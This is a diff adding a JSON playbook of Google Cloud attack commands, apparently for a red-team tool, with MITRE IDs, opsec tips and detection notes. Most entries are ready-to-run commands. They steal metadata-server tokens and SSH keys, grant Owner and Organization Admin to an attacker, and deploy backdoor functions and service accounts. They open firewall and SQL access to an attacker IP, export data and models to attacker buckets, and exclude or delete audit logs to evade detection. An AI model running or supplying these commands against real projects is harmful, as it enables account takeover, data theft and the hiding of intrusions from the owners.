@@ -1,0 +1,682 @@
+{
+  "enum_iam": {
+    "description": "Enumerating GCP IAM bindings, roles, and service accounts.",
+    "commands": [
+      {
+        "description": "List IAM policy for a project.",
+        "method": "gcloud",
+        "command": "gcloud projects get-iam-policy {project_id} --format=json"
+      },
+      {
+        "description": "List all service accounts.",
+        "method": "gcloud",
+        "command": "gcloud iam service-accounts list"
+      },
+      {
+        "description": "List service account keys.",
+        "method": "gcloud",
+        "command": "gcloud iam service-accounts keys list --iam-account {sa_email}"
+      },
+      {
+        "description": "Test permissions with testIamPermissions.",
+        "method": "gcloud",
+        "command": "gcloud projects test-iam-permissions {project_id} --permissions compute.instances.list,storage.buckets.list"
+      },
+      {
+        "description": "Enumerate IAM with GCP IAM Enumerator.",
+        "method": "gcp_enum",
+        "command": "python3 gcp_iam_enum.py --project {project_id}"
+      }
+    ],
+    "mitre": "T1087.004",
+    "prerequisites": "GCP credentials with resourcemanager.projects.getIamPolicy or iam.roles.list",
+    "opsec": "IAM enumeration is logged in Admin Activity audit logs. Use ScoutSuite or Cartography for comprehensive but targeted enumeration.",
+    "detection_ref": "Cloud Audit Logs (Admin Activity); Security Command Center misconfiguration findings; anomalous API patterns"
+  },
+  "enum_storage": {
+    "description": "Enumerating GCS buckets for misconfigurations and data exposure.",
+    "commands": [
+      {
+        "description": "List all GCS buckets in project.",
+        "method": "gsutil",
+        "command": "gsutil ls"
+      },
+      {
+        "description": "List bucket contents without authentication (public bucket).",
+        "method": "gsutil",
+        "command": "gsutil ls gs://{bucket_name}"
+      },
+      {
+        "description": "Check bucket IAM policy.",
+        "method": "gsutil",
+        "command": "gsutil iam get gs://{bucket_name}"
+      },
+      {
+        "description": "Download all objects from a bucket.",
+        "method": "gsutil",
+        "command": "gsutil -m cp -r gs://{bucket_name} ./loot/"
+      },
+      {
+        "description": "Test public access with curl.",
+        "method": "curl",
+        "command": "curl https://storage.googleapis.com/{bucket_name}"
+      }
+    ],
+    "mitre": "T1530",
+    "prerequisites": "GCP credentials with storage.buckets.list or storage.objects.list; or public bucket discovery",
+    "opsec": "GCS access is logged if Data Access audit logs are enabled (disabled by default). Public bucket access leaves only IP in access logs.",
+    "detection_ref": "GCS Data Access audit logs (requires explicit enablement); Macie-equivalent data discovery; Security Command Center public bucket alerts"
+  },
+  "metadata_ssrf": {
+    "description": "Accessing the GCP metadata service to steal tokens and credentials.",
+    "commands": [
+      {
+        "description": "Access GCP metadata endpoint.",
+        "method": "curl",
+        "command": "curl 'http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'"
+      },
+      {
+        "description": "Steal service account access token.",
+        "method": "curl",
+        "command": "curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'"
+      },
+      {
+        "description": "Get instance identity token.",
+        "method": "curl",
+        "command": "curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience={audience}' -H 'Metadata-Flavor: Google'"
+      },
+      {
+        "description": "Get SSH keys from metadata.",
+        "method": "curl",
+        "command": "curl 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys' -H 'Metadata-Flavor: Google'"
+      }
+    ],
+    "mitre": "T1552.005",
+    "prerequisites": "SSRF or code execution on GCP compute instance; metadata server at 169.254.169.254",
+    "opsec": "GCP metadata server has no equivalent to IMDSv2 \u2014 all metadata accessible without token. Fetch credentials and use quickly; 1-hour lifetime.",
+    "detection_ref": "VPC flow logs for 169.254.169.254 access from unexpected sources; Shielded VMs; workload identity to eliminate SA keys"
+  },
+  "enum_compute": {
+    "description": "Enumerating GCP compute instances and network resources.",
+    "commands": [
+      {
+        "description": "List all compute instances.",
+        "method": "gcloud",
+        "command": "gcloud compute instances list"
+      },
+      {
+        "description": "List all firewall rules.",
+        "method": "gcloud",
+        "command": "gcloud compute firewall-rules list"
+      },
+      {
+        "description": "List all VPC networks.",
+        "method": "gcloud",
+        "command": "gcloud compute networks list"
+      },
+      {
+        "description": "List all Cloud Functions.",
+        "method": "gcloud",
+        "command": "gcloud functions list"
+      },
+      {
+        "description": "List all Cloud Run services.",
+        "method": "gcloud",
+        "command": "gcloud run services list"
+      }
+    ],
+    "mitre": "T1087.004",
+    "prerequisites": "GCP credentials with compute.instances.list or viewer role",
+    "opsec": "Compute enumeration via gcloud/API is logged. Target specific zones rather than listing all. Metadata from compromised instance is stealthier than API calls.",
+    "detection_ref": "Cloud Audit Logs for compute.instances.list; Security Command Center; anomalous API source IP detection"
+  },
+  "privilege_escalation": {
+    "description": "Escalating privileges in GCP via IAM abuse and service account impersonation.",
+    "commands": [
+      {
+        "description": "Add IAM binding for Owner role.",
+        "method": "gcloud",
+        "command": "gcloud projects add-iam-policy-binding {project_id} --member='user:{email}' --role='roles/owner'"
+      },
+      {
+        "description": "Impersonate a service account.",
+        "method": "gcloud",
+        "command": "gcloud config set auth/impersonate_service_account {sa_email}"
+      },
+      {
+        "description": "Create a service account key for exfil.",
+        "method": "gcloud",
+        "command": "gcloud iam service-accounts keys create ./key.json --iam-account {sa_email}"
+      },
+      {
+        "description": "Update Cloud Function to backdoor with privesc code.",
+        "method": "gcloud",
+        "command": "gcloud functions deploy {function_name} --source ./backdoor/ --trigger-http --allow-unauthenticated"
+      },
+      {
+        "description": "Abuse iam.serviceAccounts.actAs permission to escalate via Compute Engine SA.",
+        "method": "gcloud",
+        "command": "gcloud compute instances create privesc-vm --service-account={high_priv_sa} --scopes=cloud-platform --zone={zone}  # Then SSH to VM and use its SA token"
+      },
+      {
+        "description": "Escalate via iam.serviceAccountTokenCreator role \u2014 generate tokens for any SA.",
+        "method": "gcloud",
+        "command": "gcloud auth print-access-token --impersonate-service-account={target_sa}  # Requires token creator binding on target SA"
+      },
+      {
+        "description": "Abuse Workload Identity Federation to impersonate SA from external OIDC provider.",
+        "method": "gcloud",
+        "command": "gcloud iam workload-identity-pools providers list --location=global --workload-identity-pool={pool_id} && gcloud iam service-accounts add-iam-policy-binding {sa_email} --member='principalSet://iam.googleapis.com/projects/{proj_num}/locations/global/workloadIdentityPools/{pool_id}/*' --role='roles/iam.workloadIdentityUser'"
+      }
+    ],
+    "mitre": "T1078.004",
+    "prerequisites": "GCP identity with at least one escalation-capable permission (setIamPolicy, actAs, etc.)",
+    "opsec": "IAM changes are high-fidelity alerts. Use short-lived impersonation credentials rather than creating SA keys. Clean up after engagement.",
+    "detection_ref": "Admin Activity audit log: SetIamPolicy, CreateServiceAccountKey; Security Command Center privilege escalation; org policy enforcement"
+  },
+  "secrets_enum": {
+    "description": "Hunting for secrets stored in GCP Secret Manager and environment variables.",
+    "commands": [
+      {
+        "description": "List all secrets in Secret Manager.",
+        "method": "gcloud",
+        "command": "gcloud secrets list"
+      },
+      {
+        "description": "Access a secret value.",
+        "method": "gcloud",
+        "command": "gcloud secrets versions access latest --secret={secret_name}"
+      },
+      {
+        "description": "List environment variables in Cloud Functions.",
+        "method": "gcloud",
+        "command": "gcloud functions describe {function_name} --format='value(environmentVariables)'"
+      }
+    ],
+    "mitre": "T1552",
+    "prerequisites": "secretmanager.versions.access permission; secret names discoverable via list",
+    "opsec": "Data Access audit logging for Secret Manager is disabled by default. Enable before or monitor without enabling.",
+    "detection_ref": "Cloud Audit Logs: accessSecretVersion; IAM conditions on secrets; CMEK; audit log enablement monitoring"
+  },
+  "enum_gke": {
+    "description": "Enumerating Google Kubernetes Engine clusters and extracting credentials.",
+    "commands": [
+      {
+        "description": "List all GKE clusters.",
+        "method": "gcloud",
+        "command": "gcloud container clusters list"
+      },
+      {
+        "description": "Get credentials for a GKE cluster.",
+        "method": "gcloud",
+        "command": "gcloud container clusters get-credentials {cluster_name} --region {region}"
+      },
+      {
+        "description": "Enumerate GKE node pools and machine types.",
+        "method": "gcloud",
+        "command": "gcloud container node-pools list --cluster {cluster_name} --region {region}"
+      },
+      {
+        "description": "List all workload identity bindings.",
+        "method": "gcloud",
+        "command": "gcloud iam service-accounts list --filter='displayName:gke' --format='value(email)'"
+      },
+      {
+        "description": "Check if GKE cluster has legacy auth or basic auth enabled.",
+        "method": "gcloud",
+        "command": "gcloud container clusters describe {cluster_name} --region {region} --format='value(masterAuth.username,legacyAbac.enabled)'"
+      }
+    ],
+    "mitre": "T1078.004",
+    "prerequisites": "container.clusters.list permission; kubectl with gcloud credential helper",
+    "opsec": "GKE clusters visible via GCP API. kubectl access requires cloud-platform OAuth scope or Workload Identity.",
+    "detection_ref": "Cloud Audit Logs: GKE cluster describe; Kubernetes audit log; Security Command Center GKE findings"
+  },
+  "cloud_run_functions_abuse": {
+    "description": "Abusing Cloud Run services and Cloud Functions for privilege escalation and backdooring.",
+    "commands": [
+      {
+        "description": "Deploy backdoor Cloud Function for persistent access.",
+        "method": "gcloud",
+        "command": "gcloud functions deploy backdoor --runtime python39 --trigger-http --allow-unauthenticated --source ./evil/ --entry-point handler"
+      },
+      {
+        "description": "Invoke Cloud Function to execute code as its service account.",
+        "method": "gcloud",
+        "command": "gcloud functions call {function_name} --data '{\"cmd\":\"curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H Metadata-Flavor:Google\"}'"
+      },
+      {
+        "description": "List all Cloud Run services and their URLs.",
+        "method": "gcloud",
+        "command": "gcloud run services list --format='table(name,status.url,status.conditions[0].type)'"
+      },
+      {
+        "description": "Update existing Cloud Run service with malicious image.",
+        "method": "gcloud",
+        "command": "gcloud run deploy {service_name} --image {attacker_image} --region {region} --platform managed"
+      },
+      {
+        "description": "Invoke unauthenticated Cloud Run service.",
+        "method": "curl",
+        "command": "curl -X POST {cloud_run_url}/{endpoint} -H 'Content-Type: application/json' -d '{\"cmd\":\"id\"}'"
+      }
+    ],
+    "mitre": "T1648",
+    "prerequisites": "Cloud Run or Cloud Functions invocation permission; SSRF or code execution in function",
+    "opsec": "Cloud Functions metadata server provides service account token. No IMDSv2 equivalent. Functions with internet access can be used for SSRF.",
+    "detection_ref": "Cloud Audit Logs: function invocations; VPC Connector restrictions; Workload Identity for functions; security scanning"
+  },
+  "gcp_network_abuse": {
+    "description": "Abusing GCP networking for pivoting and exfiltration.",
+    "commands": [
+      {
+        "description": "List all firewall rules and find overly permissive ones.",
+        "method": "gcloud",
+        "command": "gcloud compute firewall-rules list --filter='sourceRanges:0.0.0.0/0' --format='table(name,network,direction,allowed)'"
+      },
+      {
+        "description": "Create a firewall rule to allow attacker IP to any port.",
+        "method": "gcloud",
+        "command": "gcloud compute firewall-rules create backdoor-fw --allow tcp:0-65535 --source-ranges {attacker_ip}/32 --direction INGRESS"
+      },
+      {
+        "description": "List all VPN tunnels and interconnects.",
+        "method": "gcloud",
+        "command": "gcloud compute vpn-tunnels list && gcloud compute interconnects list"
+      },
+      {
+        "description": "List all Cloud NAT configurations.",
+        "method": "gcloud",
+        "command": "gcloud compute routers list && gcloud compute routers nats list --router {router_name} --region {region}"
+      },
+      {
+        "description": "Enumerate shared VPC host and service projects.",
+        "method": "gcloud",
+        "command": "gcloud compute shared-vpc list-associated-resources {host_project_id}"
+      }
+    ],
+    "mitre": "T1046",
+    "prerequisites": "Compute network viewer; VPC peering or shared VPC access",
+    "opsec": "VPC flow logs reveal internal network topology. Shared VPC attacks cross project boundaries. Firewall rule enumeration reveals accessible services.",
+    "detection_ref": "Cloud Audit Logs: firewall rule changes; VPC flow logs; Security Command Center network findings"
+  },
+  "bigquery_abuse": {
+    "description": "Abusing BigQuery for sensitive data access and exfiltration.",
+    "commands": [
+      {
+        "description": "List all BigQuery datasets in project.",
+        "method": "bq",
+        "command": "bq ls --project_id={project_id}"
+      },
+      {
+        "description": "List tables in a BigQuery dataset.",
+        "method": "bq",
+        "command": "bq ls {project_id}:{dataset}"
+      },
+      {
+        "description": "Query BigQuery table for sensitive data.",
+        "method": "bq",
+        "command": "bq query --use_legacy_sql=false 'SELECT * FROM `{project}.{dataset}.{table}` LIMIT 1000'"
+      },
+      {
+        "description": "Export BigQuery table to GCS bucket.",
+        "method": "bq",
+        "command": "bq extract --destination_format CSV '{project}:{dataset}.{table}' gs://{bucket}/export.csv"
+      },
+      {
+        "description": "Check BigQuery dataset IAM policy.",
+        "method": "bq",
+        "command": "bq get-iam-policy {project_id}:{dataset}"
+      }
+    ],
+    "mitre": "T1530",
+    "prerequisites": "BigQuery Data Viewer or Data Editor on sensitive datasets",
+    "opsec": "BigQuery jobs logged if Data Access audit enabled. Export to GCS for exfil. Column-level security if misconfigured.",
+    "detection_ref": "Cloud Audit Logs: BigQuery job creation; data access audit logs; column security policy audit; authorized view enforcement"
+  },
+  "gcp_persistence": {
+    "description": "Establishing persistent access in GCP environments.",
+    "commands": [
+      {
+        "description": "Create a new service account key for long-term backdoor access.",
+        "method": "gcloud",
+        "command": "gcloud iam service-accounts create backdoor-sa --display-name='Backup Service' && gcloud iam service-accounts keys create ./key.json --iam-account backdoor-sa@{project}.iam.gserviceaccount.com"
+      },
+      {
+        "description": "Grant Owner role to backdoor service account.",
+        "method": "gcloud",
+        "command": "gcloud projects add-iam-policy-binding {project} --member='serviceAccount:backdoor-sa@{project}.iam.gserviceaccount.com' --role='roles/owner'"
+      },
+      {
+        "description": "Add attacker-controlled OAuth app to GCP project.",
+        "method": "gcloud",
+        "command": "gcloud auth application-default login # Consent to attacker's OAuth app for persistent token access"
+      },
+      {
+        "description": "Set up GCP Cloud Scheduler to periodically call backdoor Cloud Function.",
+        "method": "gcloud",
+        "command": "gcloud scheduler jobs create http backdoor-job --schedule='*/5 * * * *' --uri={cloud_run_url}/backdoor --http-method=GET"
+      },
+      {
+        "description": "Audit log exclusion \u2014 exclude attacker actions from audit logs.",
+        "method": "gcloud",
+        "command": "gcloud logging sinks update _Default --exclusion='name=attacker-filter,filter=protoPayload.authenticationInfo.principalEmail={attacker_email}'"
+      }
+    ],
+    "mitre": "T1098.001",
+    "prerequisites": "Editor or higher; ability to create service accounts, IAM bindings, or API keys",
+    "opsec": "Create service account key for persistent access. Add IAM binding to existing service account. Organization-level bindings persist project deletion.",
+    "detection_ref": "Cloud Audit Logs: createServiceAccountKey, setIamPolicy; Security Command Center persistence findings; key rotation policy enforcement"
+  },
+  "workspace_abuse": {
+    "description": "Abusing Google Workspace (G Suite) for data access and persistence via compromised GCP credentials.",
+    "mitre": "T1530",
+    "commands": [
+      {
+        "description": "List Google Workspace users via Admin SDK.",
+        "method": "gcloud",
+        "command": "gcloud alpha workspace users list --customer-id {customer_id}"
+      },
+      {
+        "description": "Access Gmail as service account with domain-wide delegation.",
+        "method": "Python",
+        "command": "from google.oauth2 import service_account; creds = service_account.Credentials.from_service_account_file('key.json', scopes=['https://mail.google.com/'], subject='{target_email}')"
+      },
+      {
+        "description": "List all files in Google Drive as impersonated user.",
+        "method": "Python",
+        "command": "from googleapiclient.discovery import build; service=build('drive','v3',credentials=creds); results=service.files().list(fields='files(id,name,mimeType)').execute()"
+      },
+      {
+        "description": "Download Drive files for exfiltration.",
+        "method": "Python",
+        "command": "request=service.files().get_media(fileId='{file_id}'); fh=open('output.pdf','wb'); downloader=MediaIoBaseDownload(fh,request); done=False; [done,status]=downloader.next_chunk()"
+      },
+      {
+        "description": "Enumerate all groups and members in Workspace.",
+        "method": "gcloud",
+        "command": "gcloud alpha workspace groups list --customer-id {customer_id} && gcloud alpha workspace groups members list --group-key={group_id}"
+      }
+    ],
+    "prerequisites": "Google Workspace admin access or OAuth scope for Workspace APIs",
+    "opsec": "Workspace Admin SDK access to all user data. OAuth abuse via malicious app consent. Gmail/Drive exfiltration via API.",
+    "detection_ref": "Workspace Admin audit log; OAuth app authorization monitoring; DLP policies; data loss prevention rules"
+  },
+  "gcp_logging_evasion": {
+    "description": "Evading GCP audit logging and Cloud Monitoring detection.",
+    "mitre": "T1562",
+    "commands": [
+      {
+        "description": "Disable Data Access audit logs for a service.",
+        "method": "gcloud",
+        "command": "gcloud projects get-iam-policy {project} > policy.json && # Remove auditLogConfigs for target service && gcloud projects set-iam-policy {project} policy.json"
+      },
+      {
+        "description": "Create log exclusion to filter attacker activity from Cloud Logging.",
+        "method": "gcloud",
+        "command": "gcloud logging exclusions create attacker-exclusion --description='exclude' --log-filter='protoPayload.authenticationInfo.principalEmail=\"{attacker_sa}\"'"
+      },
+      {
+        "description": "Pause Cloud Monitoring alerting policies.",
+        "method": "gcloud",
+        "command": "gcloud alpha monitoring policies update {policy_id} --no-enabled"
+      },
+      {
+        "description": "Delete specific log entries from Cloud Logging.",
+        "method": "gcloud",
+        "command": "gcloud logging logs delete projects/{project}/logs/cloudaudit.googleapis.com%2Factivity --quiet"
+      },
+      {
+        "description": "Check what audit logs are currently enabled.",
+        "method": "gcloud",
+        "command": "gcloud projects get-iam-policy {project} --format='json' | jq '.auditConfigs'"
+      }
+    ],
+    "prerequisites": "Logging Admin role; ability to modify log sinks or disable audit logging",
+    "opsec": "Disable Data Access audit logging (enabled per-service). Delete or modify log sinks. Extremely noisy \u2014 avoid unless necessary.",
+    "detection_ref": "Cloud Audit Logs: UpdateSink, SetIamPolicy on logs; Admin Activity logs are immutable; alerting on logging configuration changes"
+  },
+  "vertex_ai_abuse": {
+    "description": "Abusing Vertex AI managed services for cost exhaustion and model theft.",
+    "mitre": "T1530",
+    "commands": [
+      {
+        "description": "List all Vertex AI models and endpoints.",
+        "method": "gcloud",
+        "command": "gcloud ai models list --region={region} && gcloud ai endpoints list --region={region}"
+      },
+      {
+        "description": "Invoke Vertex AI endpoint for model output extraction.",
+        "method": "gcloud",
+        "command": "gcloud ai endpoints predict {endpoint_id} --region={region} --json-request=request.json"
+      },
+      {
+        "description": "Export trained Vertex AI model artifacts.",
+        "method": "gcloud",
+        "command": "gcloud ai models export {model_id} --region={region} --output-path=gs://{attacker_bucket}/stolen_model/"
+      },
+      {
+        "description": "Submit GPU training job for cost exhaustion.",
+        "method": "gcloud",
+        "command": "gcloud ai custom-jobs create --region={region} --config=job.yaml  # job.yaml specifies expensive GPU cluster and long training"
+      },
+      {
+        "description": "List Vertex AI Pipelines and datasets for exfiltration.",
+        "method": "gcloud",
+        "command": "gcloud ai pipelines list --region={region} && gcloud ai datasets list --region={region}"
+      }
+    ],
+    "prerequisites": "Vertex AI user role; access to AI Platform models or notebooks",
+    "opsec": "Vertex AI notebooks have VM-level code execution. Model training jobs run with service account permissions. Pipeline manipulation for supply chain attacks.",
+    "detection_ref": "Cloud Audit Logs: Vertex AI API calls; notebook access monitoring; service account permissions for training jobs; model artifact integrity"
+  },
+  "cloud_sql_attacks": {
+    "description": "Attacking Cloud SQL instances in GCP.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "List all Cloud SQL instances.",
+        "method": "gcloud",
+        "command": "gcloud sql instances list --format='table(name,databaseVersion,ipAddresses[0].ipAddress,state)'"
+      },
+      {
+        "description": "Check Cloud SQL authorized networks (look for 0.0.0.0/0).",
+        "method": "gcloud",
+        "command": "gcloud sql instances describe {instance_name} --format='value(settings.ipConfiguration.authorizedNetworks)'"
+      },
+      {
+        "description": "Add attacker IP to authorized networks.",
+        "method": "gcloud",
+        "command": "gcloud sql instances patch {instance_name} --authorized-networks={attacker_ip}/32"
+      },
+      {
+        "description": "Export Cloud SQL database to GCS for offline access.",
+        "method": "gcloud",
+        "command": "gcloud sql export sql {instance_name} gs://{bucket}/dump.sql --database={database}"
+      },
+      {
+        "description": "Reset Cloud SQL root password.",
+        "method": "gcloud",
+        "command": "gcloud sql users set-password root --host=% --instance={instance_name} --password={new_password}"
+      }
+    ],
+    "prerequisites": "Cloud SQL instance access; public IP enabled or VPC peering; credentials or IAM auth",
+    "opsec": "Cloud SQL with public IP + 0.0.0.0/0 authorized networks is a direct target. Use Cloud SQL proxy for covert access via IAM auth.",
+    "detection_ref": "Cloud SQL audit logs; authorized network restrictions; private IP enforcement; Database Activity Monitoring for Cloud SQL"
+  },
+  "pubsub_dataflow": {
+    "description": "Abusing Pub/Sub and Dataflow for data interception and persistence.",
+    "mitre": "T1040",
+    "commands": [
+      {
+        "description": "List all Pub/Sub topics and subscriptions.",
+        "method": "gcloud",
+        "command": "gcloud pubsub topics list && gcloud pubsub subscriptions list"
+      },
+      {
+        "description": "Subscribe to a Pub/Sub topic to intercept messages.",
+        "method": "gcloud",
+        "command": "gcloud pubsub subscriptions pull {subscription_name} --auto-ack --limit=100"
+      },
+      {
+        "description": "Create rogue subscription on existing topic.",
+        "method": "gcloud",
+        "command": "gcloud pubsub subscriptions create attacker-sub --topic={topic_name}"
+      },
+      {
+        "description": "List Dataflow jobs and check for sensitive processing pipelines.",
+        "method": "gcloud",
+        "command": "gcloud dataflow jobs list --region={region} --filter='state=Running'"
+      },
+      {
+        "description": "Pull messages with raw payload from attacker subscription.",
+        "method": "Python",
+        "command": "from google.cloud import pubsub_v1; sub=pubsub_v1.SubscriberClient(); msgs=sub.pull(subscription='{sub_path}',max_messages=100); [print(m.message.data) for m in msgs.received_messages]"
+      }
+    ],
+    "prerequisites": "pubsub:Subscriber or dataflow:Developer permissions; access to data streaming pipeline",
+    "opsec": "Pub/Sub subscriptions can be created to intercept messages. Dataflow pipeline modification for data manipulation. Message data often unencrypted.",
+    "detection_ref": "Cloud Audit Logs: Pub/Sub subscription creation; Dataflow pipeline modification; message encryption enforcement; topic IAM policies"
+  },
+  "gcp_org_attacks": {
+    "description": "GCP Organization-level privilege escalation and policy abuse across multiple projects.",
+    "mitre": "T1078.004",
+    "commands": [
+      {
+        "description": "List all projects in GCP organization.",
+        "method": "gcloud",
+        "command": "gcloud projects list --filter='parent.type=organization' --format='table(projectId,projectNumber,name)'"
+      },
+      {
+        "description": "Get organization-level IAM policy.",
+        "method": "gcloud",
+        "command": "gcloud organizations get-iam-policy {org_id} --format=json"
+      },
+      {
+        "description": "Add Organization Admin binding for full org takeover.",
+        "method": "gcloud",
+        "command": "gcloud organizations add-iam-policy-binding {org_id} --member='user:{attacker_email}' --role='roles/resourcemanager.organizationAdmin'"
+      },
+      {
+        "description": "Enumerate all folders in organization for resource discovery.",
+        "method": "gcloud",
+        "command": "gcloud resource-manager folders list --organization={org_id}"
+      },
+      {
+        "description": "Audit organization policies for constraint violations.",
+        "method": "gcloud",
+        "command": "gcloud resource-manager org-policies list --project={project_id} && gcloud resource-manager org-policies describe constraints/compute.requireOsLogin --project={project_id}"
+      },
+      {
+        "description": "Use GCP IAM Privilege Escalation Toolkit (Praetorian GCPBucketBrute or ScoutSuite).",
+        "method": "ScoutSuite",
+        "command": "python3 scout.py gcp --project {project_id} --report-dir ./gcp_report/"
+      }
+    ],
+    "prerequisites": "Organization Admin or Folder Admin role; ability to modify org policies or IAM",
+    "opsec": "Org-level IAM modifications affect all projects. Disable Org Policies to remove security constraints (require VPC flow logs, restrict public IPs, etc.).",
+    "detection_ref": "Cloud Audit Logs: org policy updates at org/folder level; Security Command Center org-level findings; billing account anomalies"
+  },
+  "gcp_service_account_impersonation": {
+    "description": "Impersonate GCP service accounts using iam.serviceAccounts.actAs permission to escalate privileges or access resources.",
+    "mitre": "T1078.004",
+    "commands": [
+      {
+        "description": "List service accounts in project",
+        "command": "gcloud iam service-accounts list --project <PROJECT_ID>",
+        "method": "gcloud"
+      },
+      {
+        "description": "Check if current account has actAs permission on a service account",
+        "command": "gcloud iam service-accounts get-iam-policy <SA_EMAIL> --format json",
+        "method": "gcloud"
+      },
+      {
+        "description": "Generate access token for target service account (requires actAs)",
+        "command": "gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>",
+        "method": "gcloud"
+      },
+      {
+        "description": "Generate short-lived service account token via IAM Credentials API",
+        "command": "curl -s -X POST 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:generateAccessToken' -H 'Authorization: Bearer <YOUR_TOKEN>' -H 'Content-Type: application/json' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}'",
+        "method": "curl/IAM Credentials API"
+      },
+      {
+        "description": "Use impersonated SA to list Storage buckets",
+        "command": "gcloud storage buckets list --impersonate-service-account=<SA_EMAIL>",
+        "method": "gcloud"
+      }
+    ],
+    "prerequisites": "iam.serviceAccounts.actAs or roles/iam.serviceAccountTokenCreator",
+    "opsec": "SA impersonation via generateAccessToken creates short-lived tokens without SA key files. Token valid 1 hour by default. Harder to attribute.",
+    "detection_ref": "Cloud Audit Logs: generateAccessToken; org policy: iam.disableServiceAccountKeyCreation; short-lived token enforcement"
+  },
+  "workload_identity_federation": {
+    "description": "GCP Workload Identity Federation allows external identities (AWS, GitHub Actions, Azure AD, OIDC) to impersonate GCP service accounts. Misconfigured attribute mappings (e.g. accepting any sub claim) allow an attacker with any valid external token to impersonate high-privilege service accounts.",
+    "mitre": "T1134.001",
+    "opsec": "Token exchanges appear in Cloud Audit Logs under iam.googleapis.com/serviceAccounts.getAccessToken. Anomalous if unusual external IdP is used. Short-lived access tokens (1 hour) limit exposure window.",
+    "prerequisites": "Access to an external identity provider trusted by the GCP Workload Identity Pool (AWS role, GitHub Actions, Azure managed identity, or any OIDC provider). Knowledge of the target service account and pool configuration.",
+    "detection_ref": "GCP Threats",
+    "commands": [
+      {
+        "description": "Enumerate Workload Identity Pools and providers",
+        "method": "gcloud",
+        "command": "gcloud iam workload-identity-pools list --location=global && gcloud iam workload-identity-pools providers list --workload-identity-pool=POOL_ID --location=global"
+      },
+      {
+        "description": "Inspect provider attribute mapping for misconfigurations",
+        "method": "gcloud",
+        "command": "gcloud iam workload-identity-pools providers describe PROVIDER_ID --workload-identity-pool=POOL_ID --location=global"
+      },
+      {
+        "description": "Exchange external token (e.g. AWS STS) for GCP access token",
+        "method": "curl",
+        "command": "curl -X POST https://sts.googleapis.com/v1/token -H \"Content-Type: application/json\" -d '{\"audience\": \"//iam.googleapis.com/projects/PROJECT_NUM/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID\", \"grantType\": \"urn:ietf:params:oauth:grant-type:token-exchange\", \"requestedTokenType\": \"urn:ietf:params:oauth:token-type:access_token\", \"scope\": \"https://www.googleapis.com/auth/cloud-platform\", \"subjectTokenType\": \"urn:ietf:params:oauth:token-type:aws4_request\", \"subjectToken\": \"AWS_SIGNED_REQUEST\"}'"
+      },
+      {
+        "description": "Impersonate service account using exchanged token",
+        "method": "curl",
+        "command": "curl -X POST -H \"Authorization: Bearer EXCHANGE_TOKEN\" -H \"Content-Type: application/json\" \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/SA_EMAIL:generateAccessToken\" -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}'"
+      }
+    ]
+  },
+  "gcp_compute_metadata_exploitation": {
+    "description": "Exploit GCP Compute Engine metadata server to steal service account tokens, SSH keys, and startup scripts.",
+    "mitre": "T1552.005",
+    "commands": [
+      {
+        "description": "List all metadata available from GCP IMDS",
+        "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/?recursive=true' | python3 -m json.tool",
+        "method": "curl"
+      },
+      {
+        "description": "Steal service account access token from metadata",
+        "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
+        "method": "curl"
+      },
+      {
+        "description": "Get service account email from metadata",
+        "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'",
+        "method": "curl"
+      },
+      {
+        "description": "Read startup script that may contain credentials",
+        "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script'",
+        "method": "curl"
+      },
+      {
+        "description": "Read project-level SSH keys from metadata",
+        "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys'",
+        "method": "curl"
+      },
+      {
+        "description": "Use stolen token to enumerate GCP Storage buckets",
+        "command": "TOKEN=$(curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | python3 -c \"import sys,json; print(json.load(sys.stdin)['access_token'])\")\ncurl -s 'https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>' -H \"Authorization: Bearer $TOKEN\"",
+        "method": "curl/Bash"
+      }
+    ],
+    "prerequisites": "Code execution on GCP VM or container; 169.254.169.254 accessible",
+    "opsec": "GCP metadata server at 169.254.169.254 provides SA token, SSH keys, startup scripts. No IMDSv2 equivalent. Token valid 1 hour.",
+    "detection_ref": "VPC flow logs for metadata access; Workload Identity for GKE; metadata server network access restrictions; Shielded VM"
+  }
+}
